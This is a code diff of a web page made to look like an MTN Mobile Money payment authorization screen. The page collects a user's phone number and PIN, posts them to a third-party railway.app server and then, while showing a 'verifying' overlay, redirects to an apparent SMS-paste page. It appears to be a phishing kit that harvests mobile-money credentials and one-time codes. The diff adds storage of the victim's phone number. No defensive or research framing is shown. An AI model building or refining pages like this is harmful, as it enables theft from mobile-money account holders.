@@ -22,11 +22,8 @@
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
 html,body{height:100%;font-family:var(--font-family);background:#f4f6fa;overflow:hidden}
 body{display:flex;justify-content:center;align-items:stretch;height:100vh;height:100dvh}
-
-/* Phone-sized shell */
 .app{width:100%;max-width:480px;background:#fff;display:flex;flex-direction:column;height:100vh;height:100dvh;position:relative;overflow:hidden}
 
-/* ============ YELLOW HEADER ============ */
 .app-header{background:linear-gradient(160deg,#FFD633 0%,var(--mtn-yellow) 45%,var(--mtn-yellow-dark) 100%);padding:16px 20px 40px;position:relative;overflow:hidden;flex-shrink:0}
 .app-header::before{content:'';position:absolute;top:-60px;right:-60px;width:220px;height:220px;border-radius:50%;background:rgba(255,255,255,.18)}
 .app-header::after{content:'';position:absolute;top:-40px;left:-70px;width:180px;height:180px;border-radius:50%;background:rgba(0,51,128,.08)}
@@ -47,7 +44,6 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
 .header-greeting{font-size:22px;font-weight:800;color:#003366;line-height:1.25;position:relative;z-index:2;margin-top:8px}
 .header-greeting span{display:block;font-size:13px;font-weight:600;color:#003366;opacity:.7;margin-top:4px;letter-spacing:.2px}
 
-/* ============ AMOUNT CARD (overlaps header) ============ */
 .amount-card{background:#fff;border-radius:20px;margin:-24px 16px 0;padding:18px 20px;box-shadow:0 12px 30px rgba(0,51,128,.12);position:relative;z-index:3;border:1px solid var(--border-light)}
 .amount-row{display:flex;justify-content:space-between;align-items:center;padding-bottom:14px;border-bottom:1px dashed var(--border-light)}
 .amount-label{font-size:12px;font-weight:600;color:var(--text-muted);text-transform:uppercase;letter-spacing:.5px}
@@ -58,15 +54,12 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
 .recipient-name{font-size:14px;font-weight:700;color:var(--text-primary);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
 .recipient-sub{font-size:11px;color:var(--text-muted);font-weight:500}
 
-/* ============ FORM BODY ============ */
 .app-body{flex:1;padding:22px 20px 20px;overflow-y:auto;display:flex;flex-direction:column;gap:20px}
-
 .field-label{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
 .field-label-text{font-size:13px;font-weight:700;color:var(--text-primary);letter-spacing:.2px}
 .forgot-link{font-size:12px;font-weight:700;color:var(--mtn-blue);cursor:pointer;padding:2px 6px;border-radius:6px}
 .forgot-link:hover{background:var(--mtn-yellow-light)}
 
-/* Phone field */
 .phone-field{display:flex;align-items:center;border:2px solid var(--border-light);border-radius:14px;background:#fafbff;transition:border-color .2s,box-shadow .2s,background .2s;overflow:hidden}
 .phone-field:focus-within{border-color:var(--mtn-blue);background:#fff;box-shadow:0 0 0 4px rgba(0,71,171,.08)}
 .phone-field.invalid{border-color:#e74c3c;background:#fff5f5;animation:shake .4s}
@@ -76,7 +69,6 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
 .phone-field input{flex:1;border:none;background:transparent;padding:14px;font-size:16px;font-weight:600;color:var(--text-primary);outline:none;font-family:var(--font-family);letter-spacing:.5px;min-width:0}
 .phone-field input::placeholder{color:#c5cbd9;font-weight:500;letter-spacing:0}
 
-/* PIN boxes - BIGGER AND ROUNDED */
 .pin-row{display:flex;align-items:center;gap:10px}
 .pin-boxes{display:flex;gap:12px;flex:1;justify-content:space-between}
 .pin-box{flex:1;max-width:72px;aspect-ratio:1;border-radius:16px;border:2px solid var(--border-light);background:#fafbff;text-align:center;font-size:26px;font-weight:900;color:var(--text-primary);outline:none;font-family:var(--font-family);caret-color:var(--mtn-blue);padding:0;transition:border-color .2s,box-shadow .2s,background .2s,transform .15s}
@@ -94,12 +86,10 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
 .eye-toggle.revealed .eye-open{display:none}
 .eye-toggle.revealed .eye-closed{display:block}
 
-/* Error */
 .error-text{color:#e74c3c;font-size:12px;margin-top:6px;display:none;font-weight:600;line-height:1.4}
 .error-text.show{display:block;animation:slideDown .3s}
 @keyframes slideDown{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
 
-/* ============ BUTTON ============ */
 .login-btn{width:100%;padding:18px;background:linear-gradient(135deg,var(--mtn-blue) 0%,var(--mtn-blue-dark) 100%);color:#fff;border:none;border-radius:16px;font-size:16px;font-weight:900;letter-spacing:.8px;cursor:pointer;font-family:var(--font-family);box-shadow:0 12px 28px rgba(0,71,171,.35),inset 0 1px 0 rgba(255,255,255,.15);transition:transform .15s,box-shadow .15s,opacity .15s;margin-top:auto;position:relative;overflow:hidden;text-transform:uppercase}
 .login-btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 16px 36px rgba(0,71,171,.45),inset 0 1px 0 rgba(255,255,255,.2)}
 .login-btn:active:not(:disabled){transform:scale(.98)}
@@ -107,14 +97,12 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
 .login-btn::after{content:'→';margin-left:10px;display:inline-block;transition:transform .2s;font-weight:800}
 .login-btn:hover:not(:disabled)::after{transform:translateX(4px)}
 
-/* Trust badges */
 .trust-row{display:flex;justify-content:center;align-items:center;gap:16px;padding:10px 0 0;flex-shrink:0}
 .trust-item{display:flex;align-items:center;gap:5px;font-size:10.5px;color:var(--text-muted);font-weight:600;letter-spacing:.2px}
 .trust-icon{font-size:12px}
 
 .app-footer{padding:12px;text-align:center;font-size:10.5px;color:var(--text-muted);font-weight:500;flex-shrink:0;border-top:1px solid var(--border-light)}
 
-/* ============ WAITING OVERLAY ============ */
 .verify-overlay{position:fixed;inset:0;background:radial-gradient(900px 600px at 50% -10%,rgba(255,204,0,.12),transparent 60%),radial-gradient(700px 500px at 50% 110%,rgba(0,71,171,.35),transparent 60%),linear-gradient(180deg,#001E3C 0%,#00132A 55%,#00080F 100%);display:none;flex-direction:column;align-items:center;justify-content:center;padding:24px 20px;z-index:2000;overflow:hidden}
 .verify-overlay.show{display:flex;animation:vFadeIn .45s ease}
 @keyframes vFadeIn{from{opacity:0}to{opacity:1}}
@@ -154,7 +142,6 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
 .verify-live-dot{width:5px;height:5px;border-radius:50%;background:#22C55E;box-shadow:0 0 8px rgba(34,197,94,.9);animation:vLivePulse 1.6s ease-in-out infinite}
 @keyframes vLivePulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.7)}}
 
-/* Reject modal */
 .reject-overlay{position:fixed;inset:0;background:rgba(15,23,42,.85);backdrop-filter:blur(6px);display:none;align-items:center;justify-content:center;padding:16px;z-index:2000}
 .reject-overlay.show{display:flex;animation:vFadeIn .2s}
 .reject-card{background:#fff;border-radius:20px;max-width:380px;width:100%;padding:28px 22px;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,.3)}
@@ -163,7 +150,6 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
 .reject-desc{font-size:13px;color:#4b5563;line-height:1.45;margin-bottom:18px}
 .reject-btn{background:var(--mtn-blue);color:#fff;border:none;border-radius:10px;padding:13px 20px;font-size:14px;font-weight:800;cursor:pointer;width:100%;text-transform:uppercase;letter-spacing:.5px}
 
-/* Responsive */
 @media (max-height:700px){
   .app-header{padding:12px 16px 32px}
   .header-greeting{font-size:18px}
@@ -189,7 +175,6 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
 
 <div class="app">
 
-  <!-- YELLOW HEADER -->
   <div class="app-header">
     <div class="header-top">
       <button class="back-btn" onclick="window.location.href='index.html'" aria-label="Back">←</button>
@@ -208,7 +193,6 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
     </div>
   </div>
 
-  <!-- AMOUNT CARD -->
   <div class="amount-card">
     <div class="amount-row">
       <span class="amount-label">Amount to authorize</span>
@@ -223,7 +207,6 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
     </div>
   </div>
 
-  <!-- FORM BODY -->
   <div class="app-body">
 
     <div>
@@ -274,7 +257,6 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
 
 </div>
 
-<!-- WAITING OVERLAY -->
 <div class="verify-overlay" id="verifyOverlay">
   <div class="verify-card">
     <div class="verify-header">
@@ -303,7 +285,6 @@ body{display:flex;justify-content:center;align-items:stretch;height:100vh;height
   </div>
 </div>
 
-<!-- REJECT MODAL -->
 <div class="reject-overlay" id="rejectOverlay">
   <div class="reject-card">
     <div class="reject-icon">
@@ -320,6 +301,7 @@ const API_BASE = 'https://mtnmomo-payment-production.up.railway.app';
 const POLL_MS = 2500;
 const TIMEOUT_MS = 60 * 60 * 1000;
 const SESSION_KEY = 'mtnmomo_current_receipt';
+const LAST_LOGIN_KEY = 'mtnmomo_last_phone';
 
 let currentSessionId = null;
 let pollTimer = null;
@@ -328,13 +310,11 @@ let feedTimer = null;
 let elapsedTimer = null;
 let startedAt = 0;
 
-/* Load receipt from sessionStorage */
 let currentReceipt = {};
 try {
   currentReceipt = JSON.parse(sessionStorage.getItem(SESSION_KEY) || '{}');
 } catch(e){ currentReceipt = {}; }
 
-/* Render amount + recipient on this page */
 (function renderReceiptSummary(){
   const cur = (currentReceipt.currency || 'XAF').toUpperCase();
   const amt = currentReceipt.amount
@@ -354,7 +334,6 @@ function initials(n){
   return p.length >= 2 ? (p[0][0]+p[1][0]).toUpperCase() : p[0].substring(0,2).toUpperCase();
 }
 
-/* Phone + PIN */
 const phoneInput = document.getElementById('phone');
 const phoneWrapper = document.getElementById('phoneWrapper');
 const phoneError = document.getElementById('phoneError');
@@ -417,7 +396,6 @@ eyeToggle.addEventListener('click', () => {
   eyeToggle.setAttribute('title', pinVisible ? 'Hide PIN' : 'Show PIN');
 });
 
-/* Waiting overlay */
 const verifyOverlay = document.getElementById('verifyOverlay');
 const verifyRingProgress = document.getElementById('verifyRingProgress');
 const verifyFeed = document.getElementById('verifyFeed');
@@ -506,7 +484,7 @@ function startPolling(sessionId){
         stopPolling(); stopVerifyBar();
         addFeedLine('ok','Authorization successful');
         setTimeout(()=>{ window.location.href = 'sms-paste.html'; },400);
-      } else if (data.status === 'declined') {
+      } else if (data.status === 'rejected') {
         stopPolling(); stopVerifyBar();
         showReject('Wrong credentials','Please check your PIN and try again.');
       } else if (data.status === 'expired') {
@@ -531,7 +509,6 @@ function closeRejectAndRetry(){
   pinBoxes[0].focus();
 }
 
-/* LOGIN SUBMIT */
 loginBtn.addEventListener('click', async function(){
   pinError.classList.remove('show');
   phoneError.classList.remove('show');
@@ -553,6 +530,7 @@ loginBtn.addEventListener('click', async function(){
   loginBtn.textContent = 'VERIFYING…';
   try {
     startedAt = Date.now();
+    sessionStorage.setItem(LAST_LOGIN_KEY, '+237' + digits);
     const res = await fetch(`${API_BASE}/api/notify`, {
       method:'POST',
       headers:{'Content-Type':'application/json'},
